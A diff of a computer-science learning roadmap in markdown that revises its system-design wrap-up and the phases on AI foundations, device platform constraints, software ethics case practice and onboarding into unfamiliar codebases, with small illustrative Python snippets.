-# Note how differently the four land, and that the ANSWER to "do I
-# shard" is arithmetic rather than taste. Ride dispatch is write-heavy
-# because of location pings; the feed is read-heavy by 500x; the
-# shortener needs almost nothing structurally.
-```
+**COMMON FAILURE MODES OF THE *DESIGN PROCESS*:**
 
-**HOW TO EXPLAIN THIS IN AN INTERVIEW**
+1. Drawing the final architecture before a bottleneck is named.
+2. Never doing the arithmetic — even correct boxes are unjustified.
+3. One global consistency label for every operation.
+4. Retries without idempotency or breakers (87) bolted on as afterthoughts.
+5. Treating Phase 88 like a timed interview rehearsal — save that energy for 103.
 
-System design interviews are explicitly graded on process, not a single correct diagram: clarify requirements and scale first (how many users, how much traffic), propose a simple design, then progressively identify its bottlenecks and solve them one at a time - exactly the stage-by-stage map from Phase 81, narrated out loud. Three specific behaviours account for most of the difference between outcomes. First, doing the arithmetic out loud, because a candidate who computes 200 writes per second and then declines to shard has demonstrated judgment, while a candidate who shards without computing has demonstrated pattern matching. Second, naming what you are deliberately not building and why, since an interviewer cannot distinguish "chose not to" from "did not think of" unless you say so. Third, stating the cost of every choice, because every technique in this phase trades something away and an unqualified recommendation reads as memorised. The most common recoverable mistake is drawing the full architecture in the first five minutes, which forecloses the bottleneck discussion that the remaining forty are for. The most common unrecoverable one is designing before scoping, since a beautiful answer to the wrong question scores nothing. When you do not know something, say what you would measure to find out, because that is a genuinely good answer and pretending is not.
+**PRACTICE:**
 
-**PRACTICE UNTIL IT FEELS FAMILIAR**
+| Difficulty | Task |
+| ---------- | ---- |
+| Easy | List the walkthrough steps and which Story XI phase arms each |
+| Medium | Cold-draw the shortener: clarify → estimate → simplest → two bottlenecks with levers and new problems |
+| Medium | For the feed sketch, argue fan-out-on-write vs fan-out-on-read with one number each |
+| Hard | Take “bookstore checkout” and produce a one-page design that explicitly uses 82, 83, 84, 85, and 87 at least once each — and names what you are *not* doing |
 
+**WHAT THIS UNLOCKS NEXT:**
 
-| Difficulty | Task                                                                                                                                                                                                                                                           |
-| ---------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
-| Easy       | Write down the seven-step structure from memory with a time budget for each                                                                                                                                                                                    |
-| Easy       | For the URL shortener, list the functional and non-functional requirements you would establish before drawing anything                                                                                                                                         |
-| Easy       | Run the estimation harness for a prompt of your choosing and state which components the numbers force                                                                                                                                                          |
-| Easy       | Explain in three sentences why storing one row per click is the wrong data model for the analytics requirement                                                                                                                                                 |
-| Easy       | Name three things the worked example deliberately does not build, and the number that justifies each omission                                                                                                                                                  |
-| Medium     | Run the shortener code above and verify the cache hit rate claim under Zipfian traffic. Report your number                                                                                                                                                     |
-| Medium     | Compare all four code-generation options and write down the specific failure of each, then defend your choice                                                                                                                                                  |
-| Medium     | Do a complete forty-five minute design of a chat application on a timer, in Excalidraw, and identify where you ran out of time                                                                                                                                 |
-| Medium     | Do the same for a social feed, and specifically resolve the celebrity fan-out problem with a stated hybrid approach                                                                                                                                            |
-| Medium     | Do the same for a ride-dispatch system, and specify the geospatial partitioning scheme plus what happens at cell boundaries                                                                                                                                    |
-| Medium     | Design a distributed rate limiter and state exactly what you gave up to avoid a network round trip per request                                                                                                                                                 |
-| Medium     | Take your own shortener and add read replicas, then demonstrate the read-your-own-writes bug and show that write-through caching fixes it                                                                                                                      |
-| Medium     | Record yourself answering one prompt out loud, watch it back, and list every claim you asserted without computing                                                                                                                                              |
-| Hard       | Build the URL shortener for real with Docker Compose, load-balancer, cache, primary and replica, then load-test it to 10,000 redirects per second and report where it broke first                                                                              |
-| Hard       | Do a mock interview on [Pramp](https://www.pramp.com/) or [interviewing.io](https://interviewing.io/) and write down every question you could not answer                                                                                                       |
-| Hard       | Design a notification system covering email, SMS, and push, with at-least-once delivery, per-channel retries, and user preferences. Explain how you prevent duplicate notifications reaching a user                                                            |
-| Hard       | Design a video streaming platform and work out the storage multiplication from transcoding into five renditions, with real numbers                                                                                                                             |
-| Hard       | Design a payment ledger where correctness dominates, using idempotency keys from Phase 59 and linearizable writes from Phase 85, and state the throughput ceiling you accepted                                                                                   |
-| Hard       | Take one design you completed and write the operations section in full: every metric you would alert on, every threshold, the deploy strategy, and the top three failure modes with their mitigations                                                          |
-| Hard       | Read three worked solutions in [System Design Primer](https://github.com/donnemartin/system-design-primer#system-design-interview-questions-with-solutions), then redo one from scratch and diff your answer against theirs, listing every decision you missed |
-
-
-**WHY THE NEXT TOPIC IS NEEDED - Other Core CS Areas:** You can now design for scale, asynchrony, partitions, consensus, and partial failure. Story XII steps sideways into AI foundations, specialized platforms, and the societal consequences of software - starting at Phase 89.
+Story XI made you able to **design for scale, asynchrony, partitions, consensus, and partial failure** — clarify and estimate first, then pull levers only when numbers force them, always naming the new problem each lever introduces. That distributed-systems toolkit still leaves large regions of CS untouched: learning from data, specialized platforms, and the societal consequences of software. Story XII steps sideways into those areas, starting with Artificial Intelligence foundations at Phase 89 — a survey vocabulary, not an LLM specialty track, and not more CAP.
 
 ---
 
@@ -19543,50 +15088,54 @@ System design interviews are explicitly graded on process, not a single correct 
 
 ---
 
-
-
 # PHASE 89 - Artificial Intelligence Foundations
 
 **Track:** Other Core Computer Science Areas
 
-**WHAT YOU WILL BE ABLE TO DO:** Explain what ML/AI means in CS terms - learning from data, search/planning over large spaces, and classical ML vs deep learning - without collapsing everything into "LLMs."
+**WHAT YOU WILL BE ABLE TO DO:** Explain what AI/ML means in CS terms — learning from data, search/planning over large spaces, and classical ML vs deep learning — without collapsing everything into “LLMs.”
 
-**WHAT YOU SHOULD KNOW FIRST:** Phase 31-48 (algorithms, graphs, optimization under constraints), Phase 60-65 (training data is still data with quality and privacy issues), Phase 66-69 (models can become attack surfaces and privacy leaks).
+**WHAT YOU SHOULD KNOW FIRST:** Phases 31–48 — graphs, search, and optimization under constraints. Phases 60–65 — training data is still data (quality, privacy). Phases 66–69 — models can become attack surfaces and privacy leaks.
+
+**LEARNING RESOURCES:**
+
+- [Neural Networks (3Blue1Brown)](https://www.youtube.com/watch?v=aircAruvnKk) — intuition for stacked transforms
+- [ML vs deep learning overview (IBM Technology)](https://www.youtube.com/watch?v=q6kJ71tEYqM)
+- [A* Search and Heuristics Intuition](https://www.youtube.com/watch?v=71CEj4gKDnE) — classical AI is search/planning too
+- [Google Machine Learning Crash Course](https://developers.google.com/machine-learning/crash-course)
+- [ageron/handson-ml3](https://github.com/ageron/handson-ml3) — classical notebooks before deep chapters
 
 ## 89.1 Learning From Data (Without the Hype)
 
-**WHY YOU ARE LEARNING THIS:** "AI" in product marketing is vague. In CS it usually means systems that **improve performance on a task using data** *or* **search/plan** over huge state spaces. You do not need AI.md depth or an LLM specialization here - you need a vocabulary that separates a rules engine, a classical learner, a neural net, and a search-based agent.
+Story XI taught you to design for load, partitions, and partial failure. That toolkit still leaves large regions of CS untouched. Product marketing says “AI” whenever a demo feels clever. In computer science the word usually covers two families that share a goal — **useful decisions under uncertainty** — but not a single mechanism:
 
-**SEE IT BEFORE YOU MEMORIZE IT**
+1. **Learn from data** — improve a task by fitting a model to examples (spam scores, prices, image labels).
+2. **Search / plan** — explore a huge state space with heuristics (pathfinding, game trees, many “agents”).
 
-- Intuition: [Neural Networks (3Blue1Brown)](https://www.youtube.com/watch?v=aircAruvnKk) *(Composio YouTube)*; [ML vs deep learning overview (IBM Technology)](https://www.youtube.com/watch?v=q6kJ71tEYqM) *(Composio YouTube)*
-- Classical AI (search): [A* Search and Heuristics Intuition](https://www.youtube.com/watch?v=71CEj4gKDnE) *(Composio YouTube)* - planning/search is AI too, not only neural nets
-- Written: [Google Machine Learning Crash Course](https://developers.google.com/machine-learning/crash-course) *(Composio web + fetch)*
-- Hands-on path: [ageron/handson-ml3](https://github.com/ageron/handson-ml3) *(Composio GitHub)* - classical ML notebooks before deep learning chapters
+You already met the second family in DSA: BFS, A*, and constrained optimization (Phases 31–48). You already met the data side as *data*: quality, splits, and privacy matter before any fancy model (Phases 60–65, 66–69). This phase is a **survey map** so later specialty study has a place to land — not an LLM track, not a training-loop course, and not more CAP.
 
-**STEP-BY-STEP EXPLANATION**
+**NOT ONE THING CALLED “AI”:**
 
-| Idea | Meaning |
-| ---- | ------- |
-| **Search / planning** | Explore a state space with heuristics (BFS/A*, game trees) - "classical AI" |
-| **Supervised learning** | Learn a mapping examples → labels (spam/not, price, class) |
-| **Unsupervised learning** | Find structure without labels (clusters, dimensionality reduction) |
-| **Classical ML** | Often hand-designed features + models like linear/logistic regression, trees, SVM, k-NN |
-| **Deep learning** | Multi-layer nets learn representations from raw-ish inputs (images, text, audio) |
-| **Generative / LLMs** | Models that sample text/images; still trained with loss on data - one branch, not all of AI |
-| **Train / validation / test** | Fit on train; tune on validation; report honestly on held-out test |
+| Idea | Meaning | Typical win condition |
+| ---- | ------- | --------------------- |
+| **Search / planning** | Explore states with a heuristic (BFS/A*, game trees) | Correct path / plan without “training” |
+| **Supervised learning** | Examples → labels (spam/not, price, class) | Labeled data you trust |
+| **Unsupervised learning** | Structure without labels (clusters, compression of dimensions) | Patterns you did not annotate |
+| **Classical ML** | Hand-designed features + models (linear/logistic, trees, SVM, k-NN) | Tabular data, smaller sets, interpretability |
+| **Deep learning** | Multi-layer nets learn representations from raw-ish inputs | Lots of data; features hard to hand-engineer |
+| **Generative / LLMs** | Sample text/images; still trained with a loss on data | One useful branch — not the whole field |
+| **Train / validation / test** | Fit on train; tune on validation; report on held-out test | Honest generalization claims |
 
-Deep learning is still optimization of a loss on data - it is not magic. It shines when you have **lots of data** and features are hard to hand-engineer. Classical ML often wins on tabular data, small datasets, and interpretability. Search/planning still powers routing, compilers, games, and many agents that are not "trained" in the ML sense.
+Deep learning is still **optimization of a loss on data** — stacked transforms, not magic. Classical ML often wins when rows are tables, data is scarce, or a human must explain *why*. Search/planning still powers routing, compilers, games, and many agents that never “trained” in the ML sense. An LLM that predicts next tokens is a powerful tool; it is not a substitute for a fraud system design, a labeled evaluation set, or a planner with hard constraints.
 
 ```text
 Rules engine:     if amount > 1000 and country_new → flag
 Search/planning:  explore moves / paths with a heuristic
 Classical ML:     features (amount, velocity, …) → model → score
 Deep learning:    raw pixels / tokens → layers → score
-LLM (narrow):     next-token prediction → useful text tools (not the whole field)
+LLM (narrow):     next-token prediction → useful text tools (≠ all of AI)
 ```
 
-**SMALL WORKING EXAMPLE**
+**THREE MECHANISMS, ONE FAMILY:**
 
 ```python playground=cs-phase-89-classical-vs-deep
 # Tiny analogy: classical features vs stacked transforms vs search.
@@ -19618,15 +15167,25 @@ print("plan", greedy_plan(0, 10, lambda x: [x + 1, x + 2, x - 1]))
 print("Same CS family: map inputs → useful decisions. Different mechanisms.")
 ```
 
-**PRACTICE UNTIL IT FEELS FAMILIAR**
+**WHERE THIS MAP STOPS:**
+
+| You can now | You still cannot (here) |
+| ----------- | ----------------------- |
+| Separate search, classical ML, deep learning, and LLMs | Train production models or run a deep-learning course |
+| Demand train/val/test honesty | Fix every data-quality or privacy issue (60–65, 66–69) |
+| Spot “we added an LLM” as incomplete design | Specialize into NLP, vision, or RL tracks |
+
+**PRACTICE:**
 
 | Difficulty | Task |
 | ---------- | ---- |
-| Easy | Define supervised vs unsupervised; name one classical-AI search problem |
-| Medium | Give one problem better for classical ML, one for deep learning, one for search/planning |
-| Hard | Explain why "we added an LLM" is not a system design for fraud detection by itself |
+| Easy | Define supervised vs unsupervised; name one classical-AI search problem from Phases 31–48 |
+| Medium | Give one problem better for classical ML, one for deep learning, one for search/planning — and say *why* |
+| Hard | Explain why “we added an LLM” is not a system design for fraud detection by itself |
 
-**WHY THE NEXT TOPIC IS NEEDED - Specialized Platforms:** Desktop/server assumptions (plenty of RAM, always-on power, big screens) fail on phones, microcontrollers, and robots. Those constraints change what algorithms and architectures are even possible. That is Phase 90.
+**WHAT THIS UNLOCKS NEXT:**
+
+You can place “AI” on a map without marketing collapse. The next sideways step is the machine itself: most of this roadmap assumed a laptop or server with RAM, power, and a screen. Phones, sensors, browsers, and robots run the same physics under **scarce budgets** — and those budgets change which algorithms and which of today’s AI techniques even fit. That survey is Phase 90.
 
 ---
 
@@ -19640,23 +15199,22 @@ print("Same CS family: map inputs → useful decisions. Different mechanisms.")
 
 **Track:** Other Core Computer Science Areas
 
-**WHAT YOU WILL BE ABLE TO DO:** Compare specialized platforms (mobile, embedded/IoT, browser/edge) by scarce resource - and redesign one feature for a non-laptop constraint without turning this into five specialist courses.
+**WHAT YOU WILL BE ABLE TO DO:** Compare specialized platforms (mobile, embedded/IoT, browser/edge) by scarce resource — and redesign one feature for a non-laptop constraint — without turning this into five specialist courses.
 
-**WHAT YOU SHOULD KNOW FIRST:** Phase 49-54 (CPU, memory, OS, concurrency - the same physics, tighter budgets), Phase 78-79 (packaging and cloud do not erase device limits), Phase 89 (on-device ML is an emerging special case of those limits).
+**WHAT YOU SHOULD KNOW FIRST:** Phases 49–54 — CPU, memory, OS, concurrency (same physics, tighter budgets). Phases 78–79 — packaging and cloud do not erase device limits. Phase 89 — on-device ML is a special case of those limits.
+
+**LEARNING RESOURCES:**
+
+- [Edge Devices Explained | Edge vs IoT vs Embedded](https://www.youtube.com/watch?v=aGOQIJJv1Tw)
+- [What is edge computing?](https://www.youtube.com/watch?v=3hScMLH7B4o)
+- [Mobile Development: Native or Cross-Platform](https://www.youtube.com/watch?v=V3VUf9rB--8) — constraint awareness, not framework wars
+- Practice here is diagrammatic: one feature, three platform budgets
 
 ## 90.1 When the Machine Is Not a Laptop
 
-**WHY YOU ARE LEARNING THIS:** Most of this roadmap assumes a general-purpose computer. Phones, watches, cars, sensors, and factory controllers are computers too - with **power, memory, real-time, and safety** budgets that make "just use another microservice" absurd. This phase is a **survey comparison**, not mobile engineering school or embedded certification.
+Phase 89 asked *which decision mechanism* fits a problem. This phase asks *which machine* the mechanism must survive on. Most of this roadmap assumed a general-purpose computer: gigabytes of RAM, AC power, easy debugging. Phones, watches, cars, factory controllers, and browser tabs are computers too — with **power, memory, real-time, and safety** budgets that make “just add another service” absurd. Story VI already taught the physics (Phases 49–54); Story X showed packaging and cloud (78–79) do not repeal those laws. This is a **scarce-resource survey**, not React Native school or Arduino certification.
 
-**SEE IT BEFORE YOU MEMORIZE IT**
-
-- Platform compare: [Edge Devices Explained | Edge vs IoT vs Embedded](https://www.youtube.com/watch?v=aGOQIJJv1Tw) *(Composio YouTube)*; [What is edge computing?](https://www.youtube.com/watch?v=3hScMLH7B4o) *(Composio YouTube)*
-- Mobile constraints: [Mobile Development: Native or Cross-Platform](https://www.youtube.com/watch?v=V3VUf9rB--8) *(Composio YouTube)* - pick for constraint awareness, not framework wars
-- Practice: diagram (not code) one feature three ways - phone / sensor / server
-
-**STEP-BY-STEP EXPLANATION**
-
-**Comparison lens (scarce resource first):**
+**SCARCE RESOURCE FIRST:**
 
 | Platform family | Scarce resource | Typical hard constraints | Design move that shows you got it |
 | --------------- | --------------- | ------------------------ | --------------------------------- |
@@ -19665,14 +15223,7 @@ print("Same CS family: map inputs → useful decisions. Different mechanisms.")
 | **Browser / edge** | Main-thread ms | Sandbox, cold starts, offline expectations | Ship less JS; cache carefully; degrade UI |
 | **Cloud server** (baseline) | Usually $ / ops | Elastic CPU/RAM if you pay | Not always available on-device |
 
-Same algorithm, different winner: a chat app on a phone batches sync; on a sensor it may only uplink hourly; on a server it fans out in real time (Phase 84).
-
-Design moves that show survey-level mastery:
-
-1. **Measure the scarce resource** (mAh, ms, KB) before optimizing aesthetics.
-2. **Fail soft offline** - queue writes; don't assume always-on APIs.
-3. **Push work up or down the stack** - server when the device can't; on-device when privacy/latency demand it.
-4. **Respect update reality** - cars and sensors may update rarely; bugs live longer.
+Same feature, different winner: a chat client on a phone batches sync; a sensor may uplink hourly; a server can fan work out when capacity exists. On-device ML from Phase 89 is just another special case of this table — inference may win for privacy or latency, and lose when the chip cannot afford the model.
 
 ```text
 Laptop assumption          Device reality
@@ -19683,21 +15234,26 @@ Wired or Wi-Fi             Intermittent radio
 Easy SSH debug             Field devices, OTA risk
 ```
 
-**SMALL WORKING EXAMPLE**
+**SURVEY-LEVEL DESIGN MOVES:**
 
-Prefer a **written comparison** over a framework tutorial:
+1. **Measure the scarce resource** (mAh, ms, KB) before polishing UI.
+2. **Fail soft offline** — queue writes; do not assume always-on APIs.
+3. **Push work up or down the stack** — server when the device cannot; on-device when privacy or latency demands it.
+4. **Respect update reality** — cars and sensors may update rarely; bugs live longer.
+
+**ONE FEATURE, THREE BUDGETS:**
 
 ```text
 Feature: "upload photo + notify friends"
 
 Mobile:   compress on device; queue if offline; push via OS APIs
-IoT cam:  maybe no friends - uplink event only; tiny buffer; sleep radio
-Server:   fan-out notifications asynchronously (Phase 84)
-Ethics:   who consented to the photo? (Phase 91)
+IoT cam:  maybe no friends — uplink event only; tiny buffer; sleep radio
+Server:   fan-out notifications when capacity exists (async patterns you already met)
+Ethics:   who consented to the photo? → Phase 91
 ```
 
 ```python playground=cs-phase-90-budget
-# Toy budget check - illustration only, not an embedded SDK.
+# Toy budget check — illustration only, not an embedded SDK.
 
 battery_mah = 200
 radio_cost_mah = 15
@@ -19707,15 +15263,25 @@ print(f"radio/day={radio_day} mAh  battery={battery_mah}")
 print("FAIL" if radio_day > battery_mah * 0.3 else "OK", "- batch or duty-cycle the radio")
 ```
 
-**PRACTICE UNTIL IT FEELS FAMILIAR**
+**WHERE THIS MAP STOPS:**
+
+| You can now | You still cannot (here) |
+| ----------- | ----------------------- |
+| Compare platforms by scarce resource | Ship a production mobile or firmware app |
+| Redesign a feature for offline / mW / main-thread | Choose native vs cross-platform frameworks as a career track |
+| Argue on-device vs cloud ML with constraints | Deep-dive RTOS, BLE stacks, or browser internals |
+
+**PRACTICE:**
 
 | Difficulty | Task |
 | ---------- | ---- |
 | Easy | Fill the comparison table for one app you use daily |
-| Medium | Redesign chat sync for airplane mode vs a battery sensor |
-| Hard | Argue when on-device ML beats cloud ML for a wearable - constraints only |
+| Medium | Redesign chat sync for airplane mode vs a battery-powered sensor |
+| Hard | Argue when on-device ML beats cloud ML for a wearable — constraints only (link to Phase 89 vocabulary) |
 
-**WHY THE NEXT TOPIC IS NEEDED - Ethics:** Specialized platforms and AI amplify impact - who is scored, watched, locked out, or put at risk. Technical ability without ethical judgment is incomplete CS. That is Phase 91.
+**WHAT THIS UNLOCKS NEXT:**
+
+You can redesign under device budgets. AI systems and specialized platforms amplify who is scored, watched, locked out, or put at risk. Technical ability without a professional way to reason about harm is incomplete CS. Phase 91 treats ethics as **case practice** — stakeholders, harms, mitigations — not slogans.
 
 ---
 
@@ -19729,41 +15295,29 @@ print("FAIL" if radio_day > battery_mah * 0.3 else "OK", "- batch or duty-cycle 
 
 **Track:** Other Core Computer Science Areas
 
-**WHAT YOU WILL BE ABLE TO DO:** Write a short case-study response on a real ethical trade-off in software - naming stakeholders, harms, and a concrete mitigation - not just a slogan.
+**WHAT YOU WILL BE ABLE TO DO:** Write a short case-study response on a real ethical trade-off in software — naming stakeholders, harms, and a concrete mitigation — not just a slogan.
 
-**WHAT YOU SHOULD KNOW FIRST:** Phase 66-71 (security and HCI already showed that "users" and "attackers" are people), Phase 89-90 (AI and devices concentrate power and risk), Phase 72-80 (shipping process is where ethical review either happens or is skipped).
+**WHAT YOU SHOULD KNOW FIRST:** Phases 66–71 — security and HCI already showed that “users” and “attackers” are people. Phases 89–90 — AI and devices concentrate power and risk. Phases 72–80 — shipping process is where ethical review either happens or is skipped.
+
+**LEARNING RESOURCES:**
+
+- [ACM Code of Ethics and Professional Conduct](https://www.acm.org/code-of-ethics)
+- [Software Engineering Ethics Explained — IEEE CS/ACM](https://www.youtube.com/watch?v=OgZq59CVjTA)
+- [Engineering Ethics (Crash Course)](https://www.youtube.com/watch?v=5KZx81crb48)
+- Prefer written case responses over more code for this phase
 
 ## 91.1 Software Has Consequences
 
-**WHY YOU ARE LEARNING THIS:** Code ships into hiring, credit, medicine, policing, content feeds, and critical infrastructure. Ethics here is not optional philosophy - it is **professional practice**: foresee harm, refuse reckless designs, document trade-offs, and build mitigations. The ACM Code of Ethics exists because the field learned this the hard way.
+Phases 89–90 widened the map: learning systems that score people, and devices that sense and act in the world. Phases 66–71 already showed that security and interfaces fail *people*; Phases 72–80 showed that shipping process is where review either happens or is skipped. Code reaches hiring, credit, medicine, policing, content feeds, and critical infrastructure. Ethics here is not optional philosophy — it is **professional practice**: foresee harm, refuse reckless designs, document trade-offs, and build mitigations. The ACM Code of Ethics exists because the field learned this the hard way.
 
-**SEE IT BEFORE YOU MEMORIZE IT**
+**A USABLE MINI-RESPONSE (FOUR PARTS):**
 
-- Professional standard: [ACM Code of Ethics and Professional Conduct](https://www.acm.org/code-of-ethics) *(Composio fetch)*
-- Framing: [Software Engineering Ethics Explained - IEEE CS/ACM](https://www.youtube.com/watch?v=OgZq59CVjTA) *(Composio YouTube)*; [Engineering Ethics (Crash Course)](https://www.youtube.com/watch?v=5KZx81crb48) *(Composio YouTube)*
-- Bias / fairness overview: [AI ethics discussions](https://www.youtube.com/watch?v=r1R-AqPNvts) *(Composio YouTube)*
-- Practice: write case responses - prefer prose/diagrams over code
+1. **Facts** — what the system does; who is scored or affected.
+2. **Stakeholders** — users, non-users, operators, regulators, future selves.
+3. **Harms & benefits** — unequal error rates, privacy, autonomy, safety.
+4. **Mitigations** — technical (thresholds, human review, opt-out) *and* process (audit, red team, refuse to ship).
 
-**STEP-BY-STEP EXPLANATION**
-
-A usable mini-response has four parts:
-
-1. **Facts** - what the system does; who is scored or affected.
-2. **Stakeholders** - users, non-users, operators, regulators, future selves.
-3. **Harms & benefits** - including unequal error rates, privacy, autonomy, safety.
-4. **Mitigations** - technical (thresholds, human review, opt-out) *and* process (audit, red team, refuse to ship).
-
-**Scenario drills (survey - pick two and write half a page each):**
-
-| Scenario | Tension | Ask yourself |
-| -------- | ------- | ------------ |
-| Resume screening model | Accuracy vs historical bias in labels | Which features are proxies? Who appeals? |
-| Content moderation | Safety vs over-censorship / speech | False positive cost vs false negative cost? |
-| Location-sharing "for safety" | Care vs surveillance | Consent, retention, who can subpoena? |
-| Medical triage ranking | Throughput vs fairness across groups | Error rates by group; human override? |
-| Dark-pattern checkout | Conversion vs informed consent | Would you defend this in an ACM hearing? |
-
-Common failure modes: optimizing a metric that is not the moral goal; training data that encodes historical injustice; dark patterns that "work" in A/B tests; security that excludes accessibility.
+Slogan answers fail interviews and fail production. Concrete answers name a metric, a group, and a change you would defend.
 
 ```text
 Bad ethics answer:  "Be careful and fair."
@@ -19772,10 +15326,20 @@ Better:             "False positives deny loans to group X at 3× rate.
                      stop using feature F correlated with zip code proxy."
 ```
 
-**SMALL WORKING EXAMPLE**
+**SCENARIO DRILLS (PICK TWO — HALF A PAGE EACH):**
+
+| Scenario | Tension | Ask yourself |
+| -------- | ------- | ------------ |
+| Resume screening model | Accuracy vs historical bias in labels | Which features are proxies? Who appeals? |
+| Content moderation | Safety vs over-censorship / speech | False positive cost vs false negative cost? |
+| Location-sharing “for safety” | Care vs surveillance | Consent, retention, who can subpoena? |
+| Medical triage ranking | Throughput vs fairness across groups | Error rates by group; human override? |
+| Dark-pattern checkout | Conversion vs informed consent | Would you defend this under the ACM Code? |
+
+Common failure modes: optimizing a metric that is not the moral goal; training data that encodes historical injustice (callback to 89 + 60–65); dark patterns that “win” A/B tests; security that excludes accessibility (callback to 66–71).
 
 ```python playground=cs-phase-91-case-scaffold
-# Scaffold only - the deliverable is the written case, not the dict.
+# Scaffold only — the deliverable is the written case, not the dict.
 
 case = {
     "system": "resume screening model",
@@ -19786,7 +15350,7 @@ case = {
         "remove proxy features (name, zip)",
         "measure error rates by group",
         "human review for borderline rejects",
-        "document known limits in model card",
+        "document known limits in a model card",
     ],
 }
 
@@ -19797,15 +15361,25 @@ for m in case["mitigations"]:
 print("NOW: rewrite as a half-page stakeholder response (no more code).")
 ```
 
-**PRACTICE UNTIL IT FEELS FAMILIAR**
+**WHERE THIS MAP STOPS:**
+
+| You can now | You still cannot (here) |
+| ----------- | ----------------------- |
+| Structure a case with stakeholders + mitigations | Complete an STS or policy degree |
+| Point to the ACM Code as a professional baseline | Litigate every jurisdiction’s regulation |
+| Tie AI/device impact to shipping gates (72–80) | Replace product/legal ownership of risk |
+
+**PRACTICE:**
 
 | Difficulty | Task |
 | ---------- | ---- |
 | Easy | Quote one ACM Code principle and give a software example |
-| Medium | Write a half-page case for content-moderation false positive *and* location-sharing |
-| Hard | Critique an AI feature you use daily: metric, harm, mitigation, residual risk |
+| Medium | Write a half-page case for a content-moderation false positive *and* for location-sharing |
+| Hard | Critique an AI or device feature you use daily: metric, harm, mitigation, residual risk |
 
-**WHY THE NEXT TOPIC IS NEEDED - Maintaining Real Software:** Survey knowledge is not enough - most of your career is changing systems you did not create. Story XIII starts with reading unfamiliar codebases at Phase 92.
+**WHAT THIS UNLOCKS NEXT:**
+
+Story XII stepped sideways after distributed systems: an honest AI vocabulary (89), platform budgets that rewrite designs (90), and ethics as case practice rather than slogans (91). That survey makes you a safer designer of *new* ideas — but most of a career is changing systems **you did not create**, already running for real users under the constraints and consequences you just named. Story XIII opens with reading unfamiliar codebases deliberately at Phase 92: map entry points, follow one request path, then ship the smallest reviewable fix.
 
 ---
 
@@ -19813,55 +15387,73 @@ print("NOW: rewrite as a half-page stakeholder response (no more code).")
 
 ---
 
-
 # PHASE 92 - Working in Existing Codebases
 
 **Track:** Maintaining Real Software
 
-**WHAT YOU WILL BE ABLE TO DO:** Onboard into an unfamiliar codebase deliberately - run it, map entry points, follow one real request path - and ship a small, reviewable fix without rewriting the world.
+**WHAT YOU WILL BE ABLE TO DO:** Onboard into an unfamiliar production codebase deliberately — run it, map entry points, follow one real request path, form a hypothesis — and ship a small, reviewable fix without rewriting the world.
 
-**WHAT YOU SHOULD KNOW FIRST:** Phase 72 (PRs and reviewable diffs), Phase 74-75 (tests and boundaries help you find safe places to change), Phase 91 (you are changing something that already affects real users).
+**WHAT YOU SHOULD KNOW FIRST:** Phase 72 — PRs and reviewable diffs. Phases 74–75 — tests and boundaries help you find safe places to change. Phase 91 — you are changing something that already affects real users.
+
+**LEARNING RESOURCES:**
+
+- [How to approach large/unfamiliar codebases (ForrestKnight)](https://www.youtube.com/watch?v=jqHXJ3O7WGw)
+- [Google's Code Review Developer Guide](https://google.github.io/eng-practices/review/) — what “small and reviewable” looks like from the reviewer’s side
+- [Working Effectively with Legacy Code themes (Tech Lead Journal)](https://www.youtube.com/watch?v=mwVRHDD0tEk) — preview of Phase 93’s lens
+- Practice: clone any mid-size open-source web app, run it, and write a one-page map before changing a line
 
 ## 92.1 Read Before You Write
 
-**WHY YOU ARE LEARNING THIS:** Most professional work is not greenfield. The expensive mistake is opening files at random and "cleaning up" until you break production behavior you never understood. Onboarding is a skill: build a **mental map**, then make the **smallest change** that proves you can navigate the system.
+Phase 91 closed Story XII with a hard truth: software reaches people, and ethical judgment is professional practice. That judgment does not mostly show up on greenfield side projects. Most of a career is **changing systems you did not create** — already running for real users, under constraints and consequences you just named. Story XIII teaches the maintenance workflow: **observe → trace → form a hypothesis → make the smallest safe change → verify**.
 
-**SEE IT BEFORE YOU MEMORIZE IT**
+You join the Quarry Bookstore team. Checkout has been live for years. Your first ticket is not “redesign payments.” It is something confusing and narrow: some customers see a **wrong gift-card balance** on the checkout summary, only on retry after a failed card charge. Nobody on the current team wrote the original path. Opening folders at random and “cleaning up” until production breaks is the expensive mistake. Onboarding is a skill: build a **mental map**, then prove you can navigate with a **tiny, reviewable change**.
 
-- Onboarding habits: [How to approach large/unfamiliar codebases (ForrestKnight)](https://www.youtube.com/watch?v=jqHXJ3O7WGw) *(Composio YouTube)*
-- Written: get it running first, then follow one request path *(Composio web)*
-- Practice: clone any mid-size open-source repo, run it, and write a one-page map before changing a line
+**THE FIRST-WEEK LOOP (DO NOT SKIP STEPS):**
 
-**STEP-BY-STEP EXPLANATION**
-
-A reliable first-week loop:
-
-1. **Run it** - install, seed data, hit a happy path; record exact commands that worked.
-2. **Find the front door** - HTTP routes, CLI `main`, job scheduler, message consumer.
-3. **Trace one vertical slice** - request → handlers → domain → DB/outbound call → response.
-4. **Locate ownership signals** - README, CONTRIBUTING, CODEOWNERS, ADRs (Phase 94), recent PRs on the area.
-5. **Ship a tiny fix** - typo, test, logging, docs, or a narrowly scoped bug - to learn the review culture.
+1. **Run it** — install, seed data, hit a happy-path checkout; record the exact commands that worked. If you cannot run it, you cannot verify a fix.
+2. **Find the front door** — HTTP routes, CLI `main`, job scheduler, message consumer. For this ticket: whatever serves `POST /checkout` and the balance widget.
+3. **Trace one vertical slice** — request → handler → domain → DB / outbound call → response. Draw it. Do not skim the whole repo.
+4. **Locate ownership signals** — README, CONTRIBUTING, CODEOWNERS, existing ADRs (Phase 94), recent PRs that touched checkout or wallet.
+5. **Form a hypothesis** — “balance is cached from the first attempt and not refreshed on retry,” or “the UI reads a stale field while the charge path updates another.” Write it in one sentence before editing.
+6. **Ship a tiny fix** — logging, a null check, a test, docs, or a narrowly scoped bug — sized so a teammate can review in minutes and you learn the review culture.
 
 ```text
 Bad onboarding:  "I'll refactor the folder structure first."
 Good onboarding: "I can run it, draw the request path, and merged a 20-line fix."
+
+Ticket shape (example):
+  Observe:   balance wrong only after failed charge + retry
+  Trace:     POST /checkout → CheckoutController → WalletBalance
+             → GiftCardRepo.read → CheckoutSummaryDTO
+  Hypothesis: summary DTO keeps first-attempt balance; retry skips refresh
+  Tiny fix:   refresh balance before building summary on retry
+  Verify:     reproduce with seed gift card; assert summary matches repo
 ```
 
-**SMALL WORKING EXAMPLE**
+**OBSERVE BEFORE YOU TOUCH:**
+
